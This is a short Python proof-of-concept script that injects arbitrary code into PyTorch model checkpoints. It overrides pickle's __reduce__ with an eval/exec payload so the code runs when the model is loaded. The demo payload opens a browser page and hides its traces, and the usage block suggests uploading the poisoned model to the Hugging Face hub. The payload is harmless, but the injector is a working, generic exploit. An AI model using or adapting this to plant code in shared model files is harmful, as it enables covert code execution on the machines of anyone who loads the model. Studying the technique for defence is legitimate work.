from typing import Callable
import inspect
import torch
from transformers import AutoModel


class BadDict(dict):
    def __init__(self, inject_src: str, **kwargs):
        super().__init__(**kwargs)
        self._inject_src = inject_src
    def __reduce__(self):
        return eval, (f"exec('''{self._inject_src}''') or dict()",), None, None, iter(self.items())

def patch_save_function(function_to_inject: Callable):
    source = inspect.getsourcelines(function_to_inject)[0] # get source code
    source = source[1:] # drop function def line
    indent = len(source[0]) - len(source[0].lstrip()) # find indent of body
    source = [line[indent:] for line in source] # strip first indent
    inject_src = "\n".join(source) # make into single string
    def patched_save_function(dict_to_save, *args, **kwargs):
        dict_to_save = BadDict(inject_src, **dict_to_save)
        return torch.save(dict_to_save, *args, **kwargs)
    return patched_save_function

def patch_save_open_browser():
    def open_browser(): # put arbitrary code in here
        import webbrowser
        webbrowser.open("https://github.com/YeonwooSung")

        # just to be extra sneaky, let's clean up...
        import sys
        del sys.modules["webbrowser"]

    patched_save_function = patch_save_function(open_browser)
    return patched_save_function


'''
patched_save_function = patch_save_open_browser()

model = AutoModel.from_pretrained("distilbert-base-uncased")
model.save_pretrained("./local_folder", save_function=patched_save_function) # optionally, upload to HF hub


# later...

from transformers import AutoModel

model = AutoModel.from_pretrained("./local_folder") # or load from HF hub
print(model) # it's just a normal model... but check your browser
'''
